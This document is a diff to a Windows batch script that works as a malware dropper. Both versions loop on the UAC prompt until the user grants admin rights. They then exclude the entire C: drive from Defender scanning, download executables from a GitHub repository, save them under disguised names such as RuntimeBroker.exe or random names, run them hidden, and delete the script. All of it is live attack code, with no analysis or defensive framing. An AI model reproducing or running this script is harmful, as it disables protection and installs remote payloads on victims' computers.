@@ -1,83 +1,58 @@
 @echo off
+:: Check if the script is running with administrator privileges
 NET SESSION >nul 2>&1
 if %errorlevel% == 0 (
+    rem Script is already running with admin rights
+    rem Hide all output by redirecting to nul
     powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
+
+    rem Download RuntimeBroker.exe
     powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
-    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
-    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
-    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%TEMP%\ThirdFile.exe'" >nul 2>&1
 
-    rem Wait until the file is fully downloaded by checking the file size
-    set file=%TEMP%\ThirdFile.exe
-    set filesize=0
-    set prevsize=0
-    :checkdownload
-    rem Get the current size of the file
-    for %%F in (%file%) do set filesize=%%~zF
-    if "%filesize%" NEQ "%prevsize%" (
-        set prevsize=%filesize%
-        timeout /t 1 >nul
-        goto checkdownload
-    )
+    rem Download os6a5v5a.exe and assign a random name
+    set RANDOM_NAME=%TEMP%\%RANDOM%.exe
+    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1
 
-    rem Unblock the ThirdFile.exe to avoid any execution blocks
-    powershell -Command "Unblock-File -Path '%TEMP%\ThirdFile.exe'" >nul 2>&1
+    rem Run RuntimeBroker.exe
+    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
 
-    rem Start the third file
-    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe' -NoNewWindow" >nul 2>&1
+    rem Run the random file os6a5v5a.exe
+    powershell -WindowStyle Hidden -Command "Start-Process '%RANDOM_NAME%'"
 
-    rem Wait for the ThirdFile.exe to finish before continuing
-    :waitloop
-    tasklist /fi "imagename eq ThirdFile.exe" 2>NUL | find /I "ThirdFile.exe" >nul
-    if %errorlevel% == 0 (
-        timeout /t 1 >nul
-        goto waitloop
-    )
-
-    rem Continue once the file has finished executing
+    rem Delete the batch script itself after execution
     del "%~f0" >nul 2>&1
+
     exit
 )
 
 :loop
-powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
-if %errorlevel% NEQ 0 (
-    timeout /t 3 >nul
-    goto loop
-)
-powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
-powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zzzzz.exe' -OutFile '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%TEMP%\ThirdFile.exe'" >nul 2>&1
+    rem Trigger the UAC prompt using PowerShell from within the batch file
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
 
-rem Wait until the file is fully downloaded by checking the file size
-set file=%TEMP%\ThirdFile.exe
-set filesize=0
-set prevsize=0
-:checkdownload
-rem Get the current size of the file
-for %%F in (%file%) do set filesize=%%~zF
-if "%filesize%" NEQ "%prevsize%" (
-    set prevsize=%filesize%
-    timeout /t 1 >nul
-    goto checkdownload
-)
+    rem If user declines the UAC prompt, retry
+    if %errorlevel% NEQ 0 (
+        timeout /t 3 >nul
+        goto loop
+    )
 
-rem Unblock the ThirdFile.exe to avoid any execution blocks
-powershell -Command "Unblock-File -Path '%TEMP%\ThirdFile.exe'" >nul 2>&1
+    rem If UAC is accepted, proceed with the next task
+    rem Hide all output by redirecting to nul
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
 
-rem Start the third file
-powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe' -NoNewWindow" >nul 2>&1
+    rem Download RuntimeBroker.exe
+    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
 
-rem Wait for the ThirdFile.exe to finish before continuing
-:waitloop
-tasklist /fi "imagename eq ThirdFile.exe" 2>NUL | find /I "ThirdFile.exe" >nul
-if %errorlevel% == 0 (
-    timeout /t 1 >nul
-    goto waitloop
-)
+    rem Download os6a5v5a.exe and assign a random name
+    set RANDOM_NAME=%TEMP%\%RANDOM%.exe
+    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1
 
-rem Continue once the file has finished executing
-del "%~f0" >nul 2>&1
-exit
+    rem Run RuntimeBroker.exe
+    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
+
+    rem Run the random file os6a5v5a.exe
+    powershell -WindowStyle Hidden -Command "Start-Process '%RANDOM_NAME%'"
+
+    rem Delete the batch script itself after execution
+    del "%~f0" >nul 2>&1
+
+    exit
